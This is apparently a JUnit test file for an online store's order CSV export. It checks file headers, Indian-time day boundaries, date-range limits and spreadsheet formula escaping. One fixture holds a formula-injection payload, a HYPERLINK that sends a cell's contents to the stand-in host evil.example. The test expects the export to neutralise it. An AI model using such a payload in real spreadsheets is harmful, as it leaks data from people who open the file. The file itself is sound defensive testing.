package com.kartwala.export;

import org.junit.jupiter.api.Test;
import org.springframework.mock.web.MockHttpServletResponse;

import static org.assertj.core.api.Assertions.assertThat;

class ExportContractTest extends ApiTest {

    @Test
    void aYearOfOrdersAsAnAttachmentInIstDaysOldestFirst() throws Exception {
        MockHttpServletResponse r = export("neha.store", "2026-01-01", "2026-12-31");
        assertThat(r.getStatus()).isEqualTo(200);
        assertThat(r.getContentType()).isEqualTo("text/csv;charset=UTF-8");
        assertThat(r.getHeader("Content-Disposition")).isEqualTo("attachment; filename=\"orders-2026-01-01-to-2026-12-31.csv\"");
        assertThat(r.getContentAsByteArray()).startsWith(0xEF, 0xBB, 0xBF);   // UTF-8 byte order mark, for Excel
        assertThat(lines(r)).containsExactly(OrderExport.HEADER,
                "KW-1001,2026-01-05 10:15,\"Cotton kurta, blue\",2,1299.00,Pune,DELIVERED",
                "KW-1002,2026-03-17 23:50,\"Mug \"\"Chai time\"\"\",1,349.00,Chennai,SHIPPED",
                "KW-1003,2026-06-30 18:29,\"'=HYPERLINK(\"\"http://evil.example/?d=\"\"&A1,\"\"Click for refund\"\")\",1,99.00,Delhi,PLACED",
                "KW-1004,2026-07-01 09:00,'+91 Special offer,3,597.00,'@Mumbai,CANCELLED",
                "KW-1005,2026-12-31 23:59,\"साड़ी, सिल्क\",1,4599.00,Varanasi,PLACED");
    }

    @Test
    void theDaysAreIndianDays() throws Exception {
        assertThat(lines(export("neha.store", "2026-06-30", "2026-06-30"))).hasSize(2).last().asString().startsWith("KW-1003");   // 18:29 IST is 12:59 UTC
        assertThat(lines(export("neha.store", "2026-07-01", "2026-07-01"))).hasSize(2).last().asString().startsWith("KW-1004");
        assertThat(lines(export("neha.store", "2027-01-01", "2027-01-31"))).containsExactly(OrderExport.HEADER);   // no orders: the header only
    }

    @Test
    void badRangesAre400() throws Exception {
        assertThat(export("neha.store", "2026-02-01", "2026-01-01").getStatus()).isEqualTo(400);
        assertThat(export("neha.store", "2025-01-01", "2026-01-02").getStatus()).isEqualTo(400);   // 367 days
        assertThat(export("neha.store", "2025-01-01", "2026-01-01").getStatus()).isEqualTo(200);   // 366 days, the most
        assertThat(export("neha.store", "2026-01-01", "2026-13-01").getStatus()).isEqualTo(400);
        assertThat(export("neha.store", "2024-01-01", "2024-12-31").getStatus()).isEqualTo(200);   // a leap year: 366 days
        assertThat(jdbc.sql("SELECT count(*) FROM export_log").query(Long.class).single()).isEqualTo(2);
    }

    @Test
    void cellsAreEscapedTheSpreadsheetWay() {
        assertThat(Csv.text("plain")).isEqualTo("plain");
        assertThat(Csv.text("-5% off")).isEqualTo("'-5% off");
        assertThat(Csv.text("\tTab")).isEqualTo("'\tTab");
        assertThat(Csv.text("two\nlines")).isEqualTo("\"two\nlines\"");
        assertThat(Csv.text("")).isEqualTo("");
        assertThat(Csv.text("a = b")).isEqualTo("a = b");   // only a leading sign makes a formula
    }
}
